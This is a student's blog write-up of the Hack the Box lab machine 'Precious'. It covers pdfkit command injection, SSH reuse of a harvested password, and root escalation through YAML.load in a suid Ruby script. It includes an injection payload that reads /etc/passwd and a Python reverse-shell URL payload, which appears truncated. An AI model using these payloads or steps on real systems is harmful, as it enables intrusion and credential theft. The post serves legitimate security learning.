---
layout: single
title: Hack the Box - Precious
---

One of the boxes that I hacked this semester was Precious at Hack the Box. In this box I have managed to achieve the
root access and used tools that I haven't had the chance to try out before.

## Exploiting suid and YAML.Load()

As usual,  I scanned the box with nmap and noticed that it had open HTTP and SSH ports. The website greeted the user
with a tool that converts websites to PDF. I tried inputting the google.com url but it didn't work, so I though it might
be a security measure from Hack the Box creators. Therefore, I have started apache2 server on my localhost on Kali and
specified my URL.

| ![Main page](../../assets/img/precious/google.png) |
| Main page |

The trick worked, and the website generated a pdf of my localhost web page.

| ![Generated pdf](../../assets/img/precious/converted.png) |
| Generated pdf |

After downloading the PDF I decided to examine it with binwalk to see if there are no hidden files/messages inside and
with exiftool to see the metadata of the pdf. With that I learned that it was created using pdfkit.

| ![Pdf analysis](../../assets/img/precious/pdf.png) |
| Pdf analysis |

I googled the version and found that it is [vulnerable to an RCE exploit](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795),
in which one can provide payload after URL encoded character in a GET parameter like so:

```js
PDFKit.new("http://example.com/?name=#{'%20`cat /etc/passwd`'}").to_pdf
```

So I have prepared the payload from
[payloadallthethings github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
which would start a reverse shell using python.

```bash
http://10.10.10.159/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_IN.spawn("sh")'`
```

| ![Reverse shell](../../assets/img/precious/shell.png) |
| Reverse shell |

And soon I got the connection to a netcat listener on my Kali machine. I looked around and noticed that user henry has a hidden
folder called `.bundle` in their home directory. The `.config` file contained a password that I have used to log in to the box
through ssh.

| ![Henry](../../assets/img/precious/henry.png) |
| Henry |

| ![Linpeas](../../assets/img/precious/linpeas.png) |
| Linpeas |

Then, with the user access I ran the `linpeas.sh` script and discovered that there are two suid commands: ruby and command
to update its dependencies. When reading through the `update_dependencies.rb` file I saw that it opens a `dependencies.yml`
allowing us to control the code that is going to be loaded through `YAML.load(...)`. After some searching I found that
the function is vulnerable to code injection. I found a payload that allowed executing shell commands, so I decided to use
the advantage that it is going to be executed as root and change bash permissions to suid. This worked after few tries,
because I missed the `-p` switch in executing bash after exploitation.

| ![Exploit](../../assets/img/precious/exploit.png) |
| Explloit |
